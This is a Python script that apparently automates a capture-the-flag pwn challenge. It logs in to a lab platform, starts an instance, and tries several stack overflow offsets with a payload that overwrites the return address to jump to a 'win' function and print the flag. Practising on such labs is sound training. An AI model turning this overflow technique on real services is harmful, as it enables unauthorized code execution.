import sys, re, json, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.5)
cy.login()
cy.req("PUT", "/api/challenges/317/instance/?source=library")
host = port = None
for _ in range(10):
    time.sleep(1)
    st, b = cy.req("GET", "/api/challenges/317/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m:
        host, port = m.group(2), int(m.group(3))
        break
print("cible:", host, port)
WIN = 0x401528
for off in (140, 132, 136, 144, 148, 152, 128, 156):
    try:
        s = socket.create_connection((host, port), timeout=12)
        s.settimeout(5)
        time.sleep(0.3)
        try:
            banner = s.recv(200)
        except Exception:
            banner = b""
        payload = b"A" * off + struct.pack("<I", WIN)
        s.sendall(payload + b"\n")
        time.sleep(0.5)
        out = b""
        t0 = time.time()
        while time.time() - t0 < 4:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        s.close()
        txt = out.decode("latin-1", "replace")
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        print("offset %3d -> %r %s" % (off, txt[:120], ("FLAG " + m.group(0)) if m else ""))
        if m:
            break
    except Exception as e:
        print("offset", off, "ERR", type(e).__name__)
